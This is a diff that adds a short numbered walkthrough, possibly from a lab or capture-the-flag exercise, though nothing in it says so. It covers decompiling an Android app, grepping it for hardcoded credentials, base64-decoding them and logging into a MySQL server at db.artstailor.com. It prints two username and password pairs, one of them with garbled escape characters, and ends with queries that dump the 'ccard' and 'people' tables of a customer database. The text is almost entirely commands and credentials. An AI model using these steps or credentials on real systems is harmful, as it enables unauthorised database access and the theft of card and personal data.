@@ -1,0 +1,20 @@
+1) Download the apk from the site
+2) jadx-gui to open the apk
+3) In the command line, enter the cache
+4) grep -i 'username' -r .
+5) cat sources/00/00000800.java | grep 'b64'
+6) echo 'b64cred' | base64 -d
+7) Store the credential and password
+8) Credentials:
+    username: db_user_token
+    password: KEY022-uidv+ycMuQwy9xQ0MSlHCQ==
+9) Connect to db on db.artstailor.com
+    mysql -h db.artstailor.com --port=3306 -u db_user_token -p
+    KEY022-uidv+ycMuQwy9xQ0MSlHCQ==
+
+    mysql -h db.artstailor.com --port=3306 -u db_admin_token -p
+    KEY019-8Dqc_a!uE\x7fT`CBBKdr@@dd\x0e\n
+
+10) use customerdb
+    select * from ccard
+    select * from people
